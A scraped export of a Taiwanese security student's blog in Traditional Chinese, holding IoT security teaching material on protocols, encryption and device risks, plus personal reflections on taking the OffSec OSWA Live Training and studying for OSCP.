通訊內容加密來保護通訊內容的安全性。使用者可以在本地計算機上使用 SSH 客戶端向遠端主機發送 SSH 請求，然後再在 SSH 通道上運行 Telnet 協定。這樣，所有的 Telnet 通訊內容都將被加密，從而保護使用者的隱私和安全。但隨著 SSH 協定的泛用性增加，Telnet 逐漸被 SSH 取代，Telnet over SSH 協定已經鮮少在使用。\n在 IoT 設備中，Telnet 協定的主要功能是允許使用者通過網際網路遠端登入到設備中，並且可以通過 Telnet 協定進行設備的管理和控制。使用者可以透過 Telnet 協定對智慧居家設備進行設定和控制，例如：調節溫度、控制燈光和窗簾等。除了智慧居家設備以外，Telnet 協定還可以用於工業自動化和控制系統中。例如：工業控制系統中的可程式化邏輯控制器 (Programmable Logic Controller，PLC) 可以透過 Telnet 協定進行遠端控制以實現自動化控制系統。市面上常見的路由器通常也都會預留 Telnet 作為 Debug 埠使用。\n🐧WiFi #\rWi-Fi 是一種無線網路通訊協定，可以實現無線傳輸資料和網路連接。Wi-Fi 技術的基礎是 IEEE 802.11 標準的無線區域網路技術，它定義了無線網路的物理層和資料連結層。Wi-Fi 的工作原理是透過無線訊號在設備之間傳輸資料。Wi-Fi 設備包括無線網卡、路由器、中繼器等。無線網卡是 Wi-Fi 設備的核心，它可以將電腦或手機的訊號轉換成無線訊號，然後透過無線網路連接到路由器或中繼器。\nWi-Fi 最大的的優點是方便快捷，使用者無需網路線就能夠實現網路連接。同時，Wi-Fi 的覆蓋範圍也比有線網路更廣，可以實現更大範圍的網路連接。然而 Wi-Fi 也存在一些缺點，儘管 Wi-Fi 技術不斷發展，速度和穩定性也不斷提高，但由於無線訊號的傳輸會受到環境干擾的影響，因此 Wi-Fi 的穩定性和速度不可避免地會受到影響。同時，Wi-Fi 的安全性也需要特別注意，因為無線訊號可以被攔截，可能會導致敏感資料的泄露。\nWi-Fi 技術在 IoT 設備中扮演了重要的角色，它為設備提供了穩定的無線網路連接，使得設備之間可以實現即時通訊、資料傳輸和互動。Wi-Fi 技術的發展使得 IoT 設備的應用更加廣泛，從家庭到工業自動化控制系統都可以看到 Wi-Fi 技術的身影。在 IoT 設備中，Wi-Fi 技術的應用尤其突出。許多智慧居家設備，例如：智慧插座、智慧燈泡、智慧門鎖等都需要 Wi-Fi 連接才能實現遠端控制和監控。此外，一些工業自動化控制系統中的設備，例如：智慧監測儀器、智慧機器人等也需要 Wi-Fi 連接來實現即時通訊和資料傳輸。\n🐧MQTT #\rMQTT (Message Queuing Telemetry Transport) 是一種輕量級的通訊協定，主要用於 IoT 設備之間的通訊。相對於 HTTP 而言，MQTT 可以省略 HTTP Header 等資料的傳輸，減少流量的消耗。MQTT 協定具有低延遲、低頻寬、高效率等特點，這使得它成為 IoT 設備通訊的首選協定之一。\nMQTT 協定的特點是它可以運行在可靠性與連線品質較低的網路環境中。這使得 MQTT 協定非常適合 IoT 設備之間的通訊，因為 IoT 設備通常需要在不同的網路環境中運行，例如：Wi-Fi、行動網路等，而這些網路環境的頻寬和穩定性都有所不同。\nMQTT 協定的通訊模式基於發布/訂閱 (Publish/Subscribe) 模式。在 MQTT 協定中，設備可以發布一個主題 (Topic)，其他設備可以訂閱 (Subscribe) 主題，當發布者發布了一條消息，所有訂閱了這個主題的設備都可以接收到這條消息。這種通訊模式可以實現設備之間的即時通訊和資料傳輸，同時也可以減少通訊的延遲和頻寬占用。\n在 MQTT 協定中，設備之間的通訊可以透過 TLS 協定進行加密，從而保護通訊內容的安全性。同時，MQTT 協定還具有消息保證 (Message Assurance) 的特性可以確保消息傳輸是否順利完成。在 MQTT 中，消息保證是通過服務品質等級 (Quality of Service，QoS) 來實現。MQTT 定義了三個不同的 QoS 等級：\nQoS 0：消息發送後，不會進行確認。這表示著消息可能會遺失或重複傳輸，但是在發送時的延遲和網路開銷最低。\nQoS 1：消息發送後，會收到一個確認 (PUBACK)。如果沒有收到確認，發送者會重試發送消息，直到收到確認為止，確保消息至少被傳輸一次，但可能存在重複傳輸的情況。\nQoS 2：消息發送後，會進行兩次確認 (PUBREC、PUBREL)，然後再收到最終確認 (PUBCOMP)，確保消息僅傳輸一次，沒有遺失和重複傳輸。\n🦉IoT 常用加密技術類型 #\r🐧 通訊加密 #\r通訊加密是指將通訊過程中的資料進行加密，使得只有經過授權的使用者才能解密和讀取資料。IoT 通訊常用的加密技術類型有以下幾種：\nIPSec\n網際網路安全協定 (Internet Protocol Security，IPsec) 是一種用於保護 IP 通訊的協定。IPSec 提供了多種不同的安全性保護機制，包含加密、認證和完整性檢查。IPSec 可以在兩個端點之間建立一個安全通道，這種通道可以使用兩種不同的模式來建立：傳輸模式 (Transport mode) 和通道模式 (Tunnel Mode)。傳輸模式只對資料本身進行加密，而通道模式則對整個 IP 資料包進行加密。通道模式通常用於 VPN 連接。IPSec 可以在不需要任何特殊硬體的情況下實現通訊上的安全性。它可以在任何 IP 網路上運行，並且可以與現有的網路設備和應用程式很好的契合。\nSSL/TLS\n傳輸層安全性協定 (Transport Layer Security，TLS) 和安全通訊協定 (Secure Sockets Layer，SSL) 是兩種常用的加密協定。當客戶端和伺服器建立連接後會透過握手確認使用哪種加密演算法和密鑰來保護資料。一旦握手過程完成，SSL/TLS 就會將資料加密，以確保它在傳輸過程中不被竊聽或篡改。同時，SSL/TLS 還會使用數位簽章 (Digital Signature) 確保資料的完整性，以防止資料在傳輸過程中被偽造。\nDTLS\n資料包傳輸層安全 (Datagram Transport Layer Security，DTLS) 是一種基於 TLS 的協定，專門用於保護使用者資料包協定 (User Datagram Protocol，UDP)。由於 UDP 是一種無連接的協定，因此它比 TCP 更容易受到攻擊。DTLS 的工作原理與 TLS 類似，當客戶端和伺服器建立連接後會透過握手確認使用哪種加密演算法和密鑰來保護資料。一旦握手過程完成，DTLS 就會將資料加密，以確保它在傳輸過程中不被竊聽或篡改。同時，DTLS 還會使用數位簽章 (Digital Signature) 確保資料的完整性，以防止資料在傳輸過程中被偽造。DTLS 的主要優點是它可以提供與 TLS 相同的安全性，同時還保留了 UDP 的特點，低延遲。這使得 DTLS 非常適合用於即時通訊應用，例如：視訊會議、語音通話等。\nSSH\n安全外殼協定 (Secure Shell Protocol，SSH) 是一種用於保護遠端登錄和其他網路服務的協定。SSH 可以在不安全的網路上建立安全的通訊通道以傳輸資料。它使用公共密鑰加密來驗證使用者身份。當使用者與伺服器建立 SSH 連接時，使用者的公共密鑰會被傳送到伺服器，然後伺服器使用公共密鑰對使用者進行身份驗證。防止未經授權的人士假冒使用者身份。 SSH 可以在不同的操作系統上運行，包含：Unix、Linux、Windows 等。SSH 還有一些常用的工具，例如：scp、sftp 等，可以用於檔案傳輸、埠轉發等多種用途。\n🐧 資料加密 #\r資料加密是指將資料進行加密，只有持有解密金鑰才能解密和讀取資料。IoT 設備常用的資料加密技術有以下幾種：\nAES (Advanced Encryption Standard)\nAES 是一種對稱式加密演算法，可以用於保護 IoT 設備蒐集和傳輸的資料。AES 使用相同的密鑰進行加密和解密，因此需要確保密鑰的安全性，是 IoT 系統中常用的加密技術之一。常見的 AES 的密鑰長度有 128、192、256 位元。AES 使用分組加密的方式，將資料分為固定大小的塊，然後對每個塊進行加密。在加密過程中，AES 還會使用填充和初始化向量 (IV) 來增強演算法的安全性。\nRSA\nRSA 是一種公開密鑰加密演算法，可以用於保護 IoT 設備蒐集和傳輸的資料。RSA 演算法使用兩個不同的密鑰進行加密和解密，公開密鑰可以公開分享，私有密鑰只有管理者知道。RSA 演算法的安全性基於大數分解問題。即，將一個非常大的整數，透過因數分解分解成兩個質數的乘積。由於解決這個問題以目前的技術來說非常困難，因此 RSA 演算法目前被認為是非常安全的。RSA 演算法通常用於 IoT 系統中的數位簽章和身份驗證。\nECC (Elliptic Curve Cryptography)\nECC 是一種公開密鑰加密演算法，是一種基於橢圓曲線的加密演算法。ECC 的安全性基於橢圓曲線難題，它要求在橢圓曲線上找到一個點，這個點的坐標是一個有限域上的整數。ECC 的安全性比傳統的 RSA 加密更高，因為 ECC 使用的密鑰比 RSA 更短，並且 ECC 的運算速度更快。在 IoT 網路中，ECC 的應用非常廣泛。由於 IoT 設備通常計算能力較弱，因此使用 ECC 可以大大減少加密和解密所需的計算能力。此外，ECC 可以使用更短的密鑰來實現與 RSA 相同的安全性。\n🐧 身份驗證金鑰 #\r設備和使用者必須透過身份驗證確認身份，以確保只有授權的用戶才能訪問和控制設備。IoT 設備常用的身份驗證和金鑰管理技術有以下幾種：\nX.509\nX.509 憑證是一種公開密鑰基礎結構 (PKI) 標準，用於確認使用者或設備的身份。它是一個數位憑證，其中包含使用者或設備的公開密鑰和其他資訊。當使用者或設備需要訪問 IoT 網路時，X.509 憑證可以以確認其身份。\n","date":"8 September 2024","externalUrl":null,"permalink":"/materials/iot_security/basic_knowledge/","section":"各種資安教材","summary":"","title":"2. IoT 設備安全基礎知識","type":"materials"},{"content":"\r🦉IoT 設備基本概念 #\r🐧IoT 設備的定義 #\r物聯網 (Internet of Things，IoT) 設備是指通過在各種設備中嵌入感測器、軟體和網路模組等，具有通過網路控制與資訊傳輸的能力的設備。IoT 設備的發展與設計在近年來逐步改變我們的生活，截至 2021 年，IoT 設備的數量已達到 100 億台以上。IoT 設備通常具有以下三種模組，包含網路連接模組、資訊蒐集模組、遠端管理模組，透過三種模組與現實世界的設備結合，實現龐大的 IoT 網路架構。\n網路連接模組：IoT 設備通過各種協定，例如：Wi-Fi、ZigBee、Bluetooth 等與網際網路連接，從而實現資訊傳輸。\n資訊蒐集模組：IoT 設備配備各種感測器，可以感知並蒐集自身或環境資料，例如：溫度、濕度、壓力、座標等。\n遠端管理模組：IoT 設備能夠通過網際網路實現遠端管理和控制，使用者可以透過應用程式或網頁介面監控設備狀態，並控制其功能。\n🐧常見 IoT 設備 #\rIoT 設備作為物聯網的核心組成部分，涵蓋從民生需求到工業控制的領域。包含居家設備、工業設備、穿戴式裝置、交通設備、農業設備等。\n智慧穿戴設備：智慧穿戴設備通常是指可以配戴在身體上的智慧設備，例如：智慧手環、智慧手錶等。這類 IoT 設備可以蒐集身體的各項健康資料，例如：心率、睡眠質量、行走步數、運動模式等。並透過連接到智慧型手機或網際網路來提供個人化的健康監測和提醒。\n智慧居家設備：智慧居家設備通常是指用於實現智慧住宅概念的居家自動化和智慧控制設備。這類 IoT 設備的設計目的是將居家常用的各種設備控制方式結合並統一化，以達成智慧化與便利化的目的。這類設備可以包含智慧插座、智慧燈泡、智慧門鎖、智慧監控等。透過網際網路連接，使用者可以遠端監控並控制這些設備，達成節能、安全、便利的居住生活。\n智慧交通設備：智慧交通設備通常是指用於改進交通運輸系統效率和安全性的設備。這類 IoT 設備包含智慧交通號誌、智慧車輛、交通監測系統等。它們可以通過網際網路連接，實現交通流量監測、路況預測、導航和交通管理，從而減少交通壅塞與提高交通安全性。\n智慧農業設備：智慧農業設備用於農業生產過程的監控和管理。這類 IoT 設備包含土壤濕度感測器、氣象站、智慧灌溉系統等。能夠有效管理農場、降低人力成本。\n工業監控設備：工業監控設備通常是指用於監測和控制工業過程和裝置的設備。這類 IoT 設備可以包括感測器、工業機器、監控系統等。通常用於蒐集環境資料、監測設備運作狀態、遠端監控和故障檢測。被大量使用在輔助供應鏈提高生產效率以及品質控管。\n🦉IoT 設備安全挑戰 #\r🐧IoT 設備安全的重要性 #\r隨著越來越多的 IoT 設備連接到網際網路，如何保護這些 IoT 設備免受潛在威脅成為當前重要的議題。儘管 IoT 設備的方便能夠為我們的生活帶來許多好處，但也由於 IoT 設備的特性，使得這些設備不易防禦駭客的攻擊。這些特性包含：成本問題、更新問題、開發問題、管理問題等。\n成本問題：在 IoT 設備製造上，為了降低成本，一些 IoT 設備製造商會優先考慮設備的功能性，而忽略了安全性。由於需要盡可能壓低硬體成本，這也導致 IoT 設備上的硬體效能通常不足以負擔端點防護等相關的防禦軟體。\n更新問題：由於 IoT 設備各自適用於不同領域且沒有明確的開發規範與統一性，且生命週期與維護也由製造商自行訂定。因此及時更新和升級數量龐大的 IoT 設備軟韌體是非常困難的。如果某些 IoT 設備被發現安全風險或漏洞，使用者無法及時更新，可能導致這些有漏洞的 IoT 設備成為駭客攻擊的首要目標。\n開發問題：為了節省硬體儲存空間及閉源考量，某些 IoT 設備製造商通常會避免使用開源的作業系統，而是使用自己封裝的函式庫 (Library)，這些函式庫如果沒有經過完整的安全測試，就有可能被駭客透過逆向工程 (Reverse Engineering) 等手法找出可利用的弱點，使這些 IoT 設備受到攻擊。而由於在 IoT 設備開發時，通常會大量疊代先前的開發經驗，為避免相容性問題， IoT 設備製造商會使用較舊的編譯環境，以導致在編譯時的安全防護，例如：PIE、NX、Stack Canary 等被關閉。此外，由於不同的 IoT 設備製造商可能使用多種不同版本的軟體套件來加速開發流程，如果沒有正確設定這些軟體套件，也可能成為 IoT 設備安全上的破口。\n管理問題：IoT 設備龐大的數量，使其管理上也成為一門問題。如果有 IoT 設備連接上內部網路卻沒有被正確管理導致被駭客入侵，駭客就能利用內部網路橫向移動的手法，將被入侵的 IoT 設備做為跳板去攻擊內部網路的其他設備。由於 IoT 設備在功能正常運作的情況下，鮮少會有管理者進入內部系統檢查，也因此被駭客打下的 IoT 設備通常可以在內部網路潛伏數年之久。\n🐧OWASP #\rOWASP (Open Web Application Security Project) 是一個開放的社群非營利組織，致力於研究網際網路應用程式安全的標準、工具和技術，協助政府和企業理解並改善應用程式的安全性。\nOWASP 最著名的是一份針對網路應用程式安全性的排名 —— OWASP Top 10。它列出了目前最常見的十個網路應用程式安全風險，提供給開發人員、測試人員和資安人員作為指南以確保應用程式的安全防護。OWASP Top 10 在各個領域都受到重視，包含：企業、政府和學術界等。OWASP Top 10 的目的是提醒人們注意常見的網路應用程式漏洞，以便開發更加安全和可靠的應用程式。\n","date":"8 September 2024","externalUrl":null,"permalink":"/materials/iot_security/introduction/","section":"各種資安教材","summary":"","title":"1. IoT 設備安全簡介","type":"materials"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/series/iot-%E8%A8%AD%E5%82%99%E6%AA%A2%E6%B8%AC%E5%AF%A6%E5%8B%99%E6%94%BB%E6%93%8A%E5%AF%A6%E6%88%B0%E8%88%87%E9%98%B2%E7%A6%A6%E6%8C%87%E5%8D%97/","section":"Series","summary":"","title":"IoT 設備檢測實務：攻擊實戰與防禦指南","type":"series"},{"content":"\r課程介紹 #\r本課程旨在帶領學員學習如何針對 IoT 設備常見弱點進行檢測。課程會從開發安全與管理安全兩種角度切入，分別說明兩種領域的常見弱點，並透過實作分析與檢測具有弱點的 IoT 設備讓學員能完全熟稔 IoT 開發的弱點檢測方法。\n內容介紹 #\r隨著物聯網 (Internet of Things，IoT) 蓬勃發展，IoT 設備的數量也急速增長，針對 IoT 設備的攻擊與日俱增，因此如何在開發 IoT 設備的同時盡可能地減少易遭受利用之漏洞，是 IoT 設備開發商必須重視的問題。本課程統整了 IoT 設備上最容易被駭客利用的弱點，透過弱點的成因分析、利用管道、防禦方式三個面向，帶領學員學習 IoT 設備開發上常見的問題。在課程學習後，學員能了解如何防禦 IoT 設備的弱點，並掌握安全的 IoT 相關軟體開發方式。\n課程目標 #\r掌握安全的 IoT 開發方法 掌握 IoT 設備常見弱點的檢測 掌握防禦 IoT 設備弱點的方法 ","date":"8 September 2024","externalUrl":null,"permalink":"/materials/iot_security/","section":"各種資安教材","summary":"","title":"IoT 設備檢測實務：攻擊實戰與防禦指南","type":"materials"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/categories/iot_security/","section":"Categories","summary":"","title":"IoT_Security","type":"categories"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/categories/materials/","section":"Categories","summary":"","title":"Materials","type":"categories"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/authors/redmeow/","section":"Authors","summary":"","title":"Redmeow","type":"authors"},{"content":"","date":"8 September 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"\rTonya，在臺科大連讀了 6 年的學士 \u0026amp; 碩士的半路出家資安仔，理論上這邊應該充斥各種文章。\n我の證照 Certificate\r我の獎項 Award\r2021\r【全國大專校院資訊應用服務創新競賽】資安組佳作\n2022\r【資安技能金盾獎】嶄露頭角獎\n【國立臺灣科技大學】書卷獎\n2023\r【戴夫寇爾】資訊安全獎學金\n【資安技能金盾獎】嶄露頭角獎\n【臺灣好厲駭】表現優異獎\n2024\r【戴夫寇爾】資訊安全獎學金\n我の演講 Speech\r2022\r【AIS3 Junior】扁...逆向那遊戲 0w0\n2023\r【國立金門大學】從現實世界的 Edge Case 挖掘 Web 漏洞\n【國立金門大學】Binary 自動化動態分析\n【AIS3 Junior】神偷策士\n【國立金門大學】逆向攻城\n2024\r【國立金門大學】從 0 開始的滲透測試\n我の社團 Community\r2022\r【國立臺灣科技大學】資訊安全研究社 - 副社長\n我の論文 Paper\r2022\r【CISC】MCU 韌體模擬系統調查及效率評估\n2023\r【TANET】結合虛擬化 IoT 的軟體安全開發流程\n【CISC】基於差分隱私的特徵選擇演算法在機器學習惡意程式檢測器上的應用\n2024\r【CISC】透過上下文推斷的間接調用函數呼叫圖輔助的靜態分析\n","date":"8 September 2024","externalUrl":null,"permalink":"/","section":"Tonya's Blog","summary":"","title":"Tonya's Blog","type":"page"},{"content":"以前自己寫的一些資安教材，希望能幫到一些正在學習資安的人。\n","date":"8 September 2024","externalUrl":null,"permalink":"/materials/","section":"各種資安教材","summary":"","title":"各種資安教材","type":"materials"},{"content":"正值碩士畢業後的閒暇時光，那種從早到晚閉關做實驗的身體習慣還牢牢刻在骨子裡改不掉，正好聽說 DEVCORE x OffSec 要在臺灣第一次舉辦的 Live Training，摸了摸口袋就跑來報名了。0w0\n🦉 收穫與課程分享 #\r快速總結一下，課是 8/26 上的，試是 9/1 考的，證照是 9/4 拿的。前前後後剛好 10 天，連畢業跑離校都沒有這麼快 XD。因為很多人來問我 Live Training 的問題，所以我想說整理一下以及發篇心得。我想，這篇心得會以我自身的角度出發去回答問題以及一些課程想法，在看完我所敘述的內容後，不妨去多看看其他參與課程的學員心得，也許能讓你對 Live Training 有更全面的認識。\n❓ 授課語言是否會導致理解上的困難？ #\rLive Training 是全英文授課的。如果怕聽不懂英文，我想不必有這種擔憂，因為講師講的比多益聽力還慢而且發音咬字也更清晰。我印象最深刻的就是講師會 Cue 台下的同學回答一些問題，而回答完後，講師會回應你一個非常宏亮且完美的 Exactly!，我這輩子還沒聽過這麼完美的 Exactly!，互動體驗感極好，讓人想繼續回答問題 XD。而如果是怕聽不懂內容，我想更可以放心。事實上講師比你自己都還更怕你聽不懂，下場親自解釋以及手把手教學都是基本的，教學態度好到你都會懷疑他是不是需要你在 Google 地圖上給他個五星好評。\n❓ 課程難度會不會太高或太低？ #\r課程難度方面，我想可能是目前 OffSec 開設的所有 Live Training 中最簡單的了。這門課教授的內容並不會超出 OWASP TOP 10，對於產業相關人士我想是毫無壓力。而如果是非相關產業人士，我建議上課前可以稍微了解一下 OWASP TOP 10 各自的成因，但不必細究。這能夠幫助你學習到相關主題時更快進入狀況。當然，OffSec 的課程最與眾不同的地方便是極為注重實作能力，因此，除了課程上的理論知識外，會有相當大的時間提供給學員實作 Lab 練習。以我個人而言當然是求之不得，Lab 就是來一個扁一個，來兩個扁一雙。如果是平常喜歡玩遊戲蒐集全成就的人，恭喜你，這邊也有個白金獎盃 100% 全成就可以蒐集。\n❓ 授課講師教得如何？ #\r我想講師的專業性是無庸置疑的。除了講師以外，我也想特別提到課程的助教，事實上我隱隱覺得那位助教可能已經把 OffSec 的證照全拿下或者他其實本身就負責設計課程。有時他僅僅只是經過你身旁就知道你哪邊可能會有疑問，並且會主動教你，感覺就像是把教材都當成心法了，不僅只是教材，即使是 Lab 實作也不例外。所以，如果是害怕 Lab 做不出來的人，我有一言，請諸位靜聽，正所謂 授課不懂問講師，Lab 不決問助教 。講師跟助教就是周瑜跟張昭。問問不吃虧，人都特地來現場了，回家問 GPT 還要繳訂閱費，說不定也沒有這兩位回答的清晰呢。\n🦉 個人心得 #\r筆鋒一轉，再來就是一些我個人的上課心得了，首先是上課形式，我必須聲明，儘管這門課最終的目標是考取證照，但 Live Training 跟外界一般的證照班最不同的是，Live Training 沒有所謂的證照考試技巧、考古題等等這些很 目的性 的授課。我想對於受過台灣標準教育以及上過證照導向課程的人應該能很強烈感受到其差異。Live Training 本身更接近學習知識的過程而非考試。而這個特性的好壞則因人而異。\n🐣 學習方式並非只有一種選擇 #\r我想先分享吸收新知這一行為本身。誠如求學過程中你我所經歷過的，學習本身便是貪婪的汲取知識的體現。而在這一過程中難免會遇到撞牆期。尤其在我學習資安時，那堵牆壁更是明顯。事實上，我目前共有兩張 OffSec 的證照，包含了 OSCP 與這門 Live Training 的目標 OSWA。OSCP 是我獨自學習考取的，我必須承認，這不是個一帆風順的過程，在獨自學習中產生的各種疑惑，你都必須自行排解並得出解答。若非是我在學習 OSCP 時有志同道合的同儕一起陪我思考並解決問題，我勢必需要花費更大量的時間去學習，而 Live Training 則能避免掉這一部分的成本。\n【Teaching others teaches yourself】 包含講師以及助教、一起學習的同學都能夠幫助你排解學習上的疑惑。當然，我並不是要分出這兩者孰優孰劣。事實上，我也十分享受一個人坐在電腦前全心全意學習的這一過程，有一種歲月靜好的餘韻在。但如果想試看看另一種有別於自我研究的學習方式，我認為參與課程會是不錯的選擇，當然，並不一定要是 Live Training，只是 Live Training 更貼近我心中所謂學習知識的樣貌，我想這一點同樣也是因人而異的。\n🐣 對課程時間安排的取捨 #\r接著，我想分享的是課程安排。本次的 Live Training 採用的是連續一週 5 天的密集課程。與許多機關的培訓課程或是證照課程通常會為了迎合社會人士而選擇開設在多個假日不同。事實上，我認為密集式的課程更能有效地吸收知識。原因在於，資安技術的學習是需要非常高 Concentration 的。但如果將課程內容分散，學習者會需要承受喚回記憶與遺忘的時間成本。同樣地，講師也必須將課程切分成適合假日授課的課綱，可能會導致較為困難的內容授課時間被壓縮。我想，這不論對於講師或者學習者都是非常不利的。\n但密集授課也不是完美的。當然也會產生其特有的問題。有些學習者會擔心在 Live Training 期間跟不上講師授課的內容，事實上，OffSec 有提供三個月的課程教材與 Lab 練習，讓學習者在 Live Training 後能有自己沉澱學習的機會。使得這些知識並不僅僅只是你生涯的一位過客。更進一步的解釋，其實 OffSec 的教材本身便是朝向能讓學習者能在自我進修的這一過程，盡可能地有良好的體驗設計的。我想，由於教材的該特性，因此在課程安排這點上，我會更欣賞目前 Live Training 的授課方式。\n🐣 對於這張證照的經驗分享 \u0026amp; 想法 #\r最後，應該很多人關心的是證照考取相關的心得。對於 OSWA 這張證照的難度應該是眾說紛紜。許多人會說它是 OffSec 證照中最簡單的一張。也有許多人說它考起來比 OSWE (OSWA 的上位證照) 還要難上許多。我想先以我自身的角度來講述該證照的考取經驗。我從初次學習資安至今應是 3 年，並且持有一張 OSCP 證照。儘管如此，我仍認為我並非 Web Security 的專業人士。原因在於 OSCP 儘管有教授部分的 Web Security。但其更偏重於滲透測試這一流程本身。使得做為 Initial Access 中一部分的 Web Security，在 OSCP 中並沒有非常詳盡的介紹。再舉個實際的例子，我曾經面試過臺灣資安界的最耀眼的公司 DEVCORE 的實習生。而在面試過程中，我就有兩個非常基礎的 Web Security 問題沒辦法回答出來。這兩個問題我會放在文章的最後，非常歡迎沒有學習過並且有志考取 OSWA 的學習者，將這兩個問題記錄下來，並且待到學成後再嘗試回答看看。\n回到話題本身，以我的角度而言，我認為這張證照的難易度很大程度取決於挑戰者本身。原因是，這張證照有許多的挑戰環節都希望你培養一個意識——【跳出框架之外】。在 Live Training 上學到的知識，或者說 OSWA 的教材所提供的知識為你的資安技術提供了堅實的基礎，足夠你考取這張證照。然而還有更重要的一點是意識的培養。事實上，很多資安的風險往往在不經意間、在預想不到的地方產生了星火，於是在檯面下慢慢地釀成燎原之勢，釀成大禍。而能否及時在星火初生之際發現並將其扼殺，我認為便是這張證照想考驗測試者的能力。因此，我認為單論 OSWA 這張證照在考取上，對於既有技術者而言，Live Training 事實上並沒有太大的助益，你仍然需要透過課程中的 Lab 實作來培養你的意識。但對於初心者而言，Live Training 能夠幫助你將撲滅火勢的一切所需準備好，而你只需要全心全意地尋找那可能導致燎原之勢的起火點。我想，這張證照對你而言，便是唾手可得之物。\n🦉 結論 #\r在遭受實驗與論文口試的洗禮下，能全心全意的學習一門知識的時間越發覺得彌足珍貴。特別是自己有興趣的事物，學習起來更加得心應手。感謝舉辦本次的 Live Training 的 DEVCORE 與 OffSec。讓我最後還能回憶起美好的朝九晚六高中生時光。\n🎃DEVCORE 面試時的兩個問題 #\r你知道 XXE 是什麼嗎? 同源的定義是指什麼? Domain、協定、埠這些有差嗎? ","date":"4 September 2024","externalUrl":null,"permalink":"/blogs/oswa/","section":"Blogs","summary":"","title":"2024 DEVCORE x OffSec Live Training","type":"blogs"},{"content":"\r記一點心得感想。應該大部分都會是資安。\r","date":"4 September 2024","externalUrl":null,"permalink":"/blogs/","section":"Blogs","summary":"","title":"Blogs","type":"blogs"},{"content":"","date":"4 September 2024","externalUrl":null,"permalink":"/categories/certificate/","section":"Categories","summary":"","title":"Certificate","type":"categories"},{"content":"\r🦉 收穫 #\r總學習時間約 60 天，總時數約 350 小時，考試耗時 16 小時。使用了 1 次考試機會，取得了 100 / 110 分。\n🦉 心路歷程 #\r2023 年 1 月，我決定考取 OSCP。距離我初次開始學習資安的起點 —— AIS3 ，正好 18 個月。一年半的時光聽起來很短，但似乎足夠一名學生在該領域初露鋒芒。但明顯地，我似乎沒能達到我理想中的目標。資安領域具有強者文化，在踏入這領域時我便看著強者的背影。我不認為這是一件壞事，正因為有強者，後來者才有了對未來的憧憬與追逐的目標。有一句話能很好地詮釋：『 長江後浪催前浪，一代新人換舊人 。』\n背影是什麼？我會說那是一個追逐的目標，與里程碑不大相同。當你在前進時，背影也在前進。當你達成一個里程碑時，背影也同時取得了成就。或許有人會恐懼，因為到最後莫不是如夸父追日。沒錯，因為背影不會停下來等你。當你超越了背影的那刻，就換你成為其他人的背影了。這是一條漫漫長路，因為目的地或許在那燈火闌珊處，也或許是星辰大海的征途。因此在追逐背影的路途上需要有里程碑來幫助你看到自己前行的腳步，這也正是為什麼大部分初入資安的人會選擇 OSCP 作為自己的目標，因為那正是一個具有明確方向的里程碑。但也請深思，這個里程碑真的是必需的嗎？考取證照當然是目標，但絕對不是終點，更甚者也許只是起點。若在考證照的路途上失去了追逐的背影或迷失了方向，是否還有意義？\n「我想學滲透測試嗎？」這個疑問產生的時間點是 2022 年 5 月，一次場域滲透測試的活動中。我當然不是一名滲透仔或者 Web 狗。在我剛開始學習資安時，Binary 是我的第一選擇。在打 CTF 時，Reverse 永遠是我第一個目標，在這之後才是 Web。理所當然，我在那個場域是做不了太多事情的。但如此近距離接觸滲透測試，作為學習的引燃點已經足矣。這聽起來便是我考 OSCP 的緣由，但我必須清楚的說明，學習滲透測試的起點從來就不只是 OSCP。\n我第二次參與 AIS3 是以 Staff 的身份參加 AIS3 2022。與第一次參與的 AIS3 2021 不同，我聽得懂台上講師授課的內容了。沒錯，我第一次參加 AIS3 的時候，課程是有 80% ~ 90% 超出我的理解範圍的。而這次，有 80% ~ 90% 在我的理解範圍內。也正因為累積了足夠的里程並且得到了驗證，我才能回答上一個問題。「是，因為我覺得挖漏洞很有趣。」但緊接著便是一連串的問題。\n「我真的需要 OSCP 嗎？我考得到嗎？」可能在讀這篇文的人很難想像，但這些問題直到考 OSCP 的前一個月我才得到解答。這份豁然開朗或許也幫助我取得了 OSCP。這些問題的答案來自 DEVCORE 的 Allen Own 與 Ginoah，至於他們怎麼回答的，雖然不是什麼值得賣關子的話題，但請讓我保密到本文的結尾。\n🦉 學習過程 #\r🍽️ 準備階段 #\r以下是 Tonya 的食譜，請預先準備好以下材料，並依據個人口味斟酌調整配方。\n1999 美金 4-6 小時的練習時間 x 90 天份 ChatGPT Google 搜尋引擎 Notion 修禪的心 x 1 顆 （正在就讀碩士建議準備 2 顆） 🍽️ 食材前處理 #\r用魔法小卡將 1999 美金交給 OffSec 以取得 365 天教材許可權與 2 次 OSCP 考試機會。 在 90 天來臨前，預先看點教材來讓自己在學習時不至於手足無措。 在行事曆上框出不會被奇怪事情抓去奇怪地方的 90 天，每天放入 4~6 小時練習時間。 🍽️ 漫長的靶 🐤 料理過程 #\r取出放入 4~6 小時練習時間的前 30 天，開始按照 OSCP 教材學習。 在學習過程中，每一小節學習完畢後使用 Notion 將該節重點筆記下來，每一大節學習完畢後將筆記分類整理，並確保筆記在每日睡眠起床後仍是可讀狀態。請注意，記筆記的時間比學習時間長是正常的，接受不了的同學建議接受事實。 取出放入 4~6 小時練習時間的後 60 天，取出修禪的心置於桌面上。開始嘗試利用前 30 天所學習到的知識與筆記料理靶機。 一開始還不會料理靶機的同學可能會需要一整天才能料理 1 台靶機，請同學將料理過程寫成詳細的 WriteUp 放在 Notion 中以備不時之需。 靶機開始展現出教材上完全沒有提到的東西，請同學取出 ChatGPT 與 Google 搜尋引擎開始自立自強。 靶機展現出的姿勢卡了同學整整 1 天還沒有進度，請同學取出修禪的心開始一頓胖揍後接受事實，並且去睡一覺。 睡一覺後有靈感的同學在料理完靶機後請繼續料理下一隻靶機。沒有靈感的同學可以到官方 Discord 查看提示。 在料理第 10 ~15 隻靶機後同學會得到 BUFF，效果是在未來一定時間內料理靶機速度提升。該 BUFF 持續時間約為 10 隻靶機。請同學趁著 BUFF 爆發一波。 在料理第 25 ~ 30 